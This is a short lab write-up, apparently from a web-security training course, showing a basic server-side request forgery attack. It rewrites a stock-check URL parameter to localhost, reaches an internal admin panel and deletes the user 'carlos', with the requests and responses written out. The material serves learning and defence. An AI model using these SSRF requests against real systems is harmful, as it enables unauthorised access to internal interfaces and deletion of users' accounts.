# Lab 1: Basic SSRF against the local server

- Vulnerable feature: stock check functionality
- Goal: chang the stock check URL to access the admin interface at `http://localhost/admin` and delete the user carlos.

### Analysis
- Open Burp Suite
- Click `check stock`
```
# Request
stockApi=http%3a//stock.weliketoshop.net%3a8080/product/stock/check%3fproductId%3d1%26storeId%3d2

# Response
851
```
- `ctrl + shift + u`: decode the url
- `ctrl + u`: encode the url
```
# Request
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=2

# change this url to localhost
stockApi=http://localhost
```
```html
<!-- Response -->
<a href="/admin">
    Admin panel
</a>
```

- Go to `/admin` directory
```
# Request
stockApi=http://localhost/admin
```
```html
<!-- Response -->
<a href="/admin/delete?username=carlos">
    Delete
</a>
```

- Delete username carlos
```
# Request
stockApi=http://localhost/admin/delete?username=carlos
```
- Click `Follow redirection` in burpsuite
- Congratulations!